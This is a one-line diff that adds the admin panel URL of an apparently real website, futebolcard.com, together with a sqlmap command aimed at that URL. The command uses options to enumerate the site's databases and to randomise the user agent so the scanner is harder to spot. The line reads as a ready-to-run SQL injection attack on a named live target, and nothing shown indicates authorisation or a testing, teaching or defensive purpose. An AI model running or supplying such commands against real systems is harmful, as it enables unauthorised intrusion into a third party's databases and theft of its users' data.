@@ -1,0 +1,1 @@
+https://admin.futebolcard.com/admin (GET)  # sqlmap.py https://admin.futebolcard.com/admin -dbs --random-agent
